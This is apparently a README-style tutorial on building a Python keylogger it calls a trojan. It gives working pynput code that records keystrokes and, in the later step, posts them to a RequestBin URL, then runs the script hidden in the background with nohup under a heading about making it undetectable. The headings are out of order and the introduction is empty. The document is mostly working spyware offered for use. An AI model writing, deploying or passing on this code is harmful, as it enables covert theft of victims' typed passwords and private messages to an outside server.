# Creating a simple Trojan 

This is a simple tutorial on how to create a simple trojan using python. 

## What is a trojan?
## Step 2: Lets print all keystrokes to the console


```python
from pynput.keyboard import Key, Listener

def on_press(key):
    print(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```
## Step 3: Lets print a line to the console when a key is pressed

```python
from pynput.keyboard import Listener

keys = ''

def send_keys():
    global keys
    global last_send
    print(keys)
    keys = ''

def on_press(key):
    global keys
    str_key = str(key)
    if str_key == "Key.tab":
        str_key = '\t'
    elif str_key == "Key.enter":
        str_key = '\n'
    elif str_key == "Key.space":
        str_key = ' '
    elif str_key == "Key.backspace":
        str_key = ' bspace '
    elif "Key" in str_key:
        str_key = str_key.replace("Key.", "")
        str_key = f" {str_key} "
    keys += str_key.strip('\'')
    if len(keys) >= 20:
        send_keys()

with Listener(on_press=on_press) as listener:
    listener.join()
```

## Step 4: Lets take things to the next level

- Open [Request bin](https://requestbin.net/)

- Click **Create a RequestBin** 

```python
from pynput.keyboard import Key, Listener
import requests

keys = ''
request_bin_url = 'https://{request bin url}'

def send_keys():
    global keys
    global last_send
    print(keys)
    requests.post(request_bin_url, data=keys)
    keys = ''

def on_press(key):
    global keys
    str_key = str(key)
    if str_key == "Key.tab":
        str_key = '\t'
    elif str_key == "Key.enter":
        str_key = '\n'
    elif str_key == "Key.space":
        str_key = ' '
    elif str_key == "Key.backspace":
        str_key = ' bspace '
    elif "Key" in str_key:
        str_key = str_key.replace("Key.", "")
        str_key = f" {str_key} "
    keys += str_key.strip('\'')
    if len(keys) >= 20:
        send_keys()

with Listener(on_press=on_press) as listener:
    listener.join()
```

## Step 4: Lets make it FUD


```bash
nohup python3 send_line.py &
```
### Click [here](https://github.com/EXTREMOPHILARUM/trojan) to download repo.
